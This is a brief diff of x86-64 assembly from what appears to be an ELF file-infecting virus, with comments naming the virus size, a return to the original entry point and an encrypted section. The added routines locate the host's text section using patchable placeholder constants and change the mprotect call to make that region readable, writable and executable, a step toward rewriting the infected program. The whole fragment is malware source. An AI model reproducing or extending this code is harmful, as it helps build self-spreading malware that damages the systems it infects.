@@ -64,9 +64,20 @@ _getencryptedsectionaddr:
     add rax, 0x66666666 ; start of encrypted section
     ret
 
+_gettextsectionaddr:
+    call _get_rip
+    sub rax, 0x22222222 ; virus size without ret2oep
+    sub rax, 0x22222222 ; new_entry_point
+    add rax, 0x22222222 ; start of text section
+    ret
+
+_gettextsize:
+    mov r14, 0x33333333
+    ret
+
 _mprotect:
-    call _getencryptedsectionaddr
-    call _getencryptedsectionsize
+    call _gettextsectionaddr
+    call _gettextsize
     mov rdi,  rax
     and rdi, -0x1000
     mov rax, 0xa
@@ -74,6 +85,8 @@ _mprotect:
     mov rdx, 0x07
     syscall
     ret
+
+
 
 _getencryptedsectionsize:
     mov r14, 0x55555555
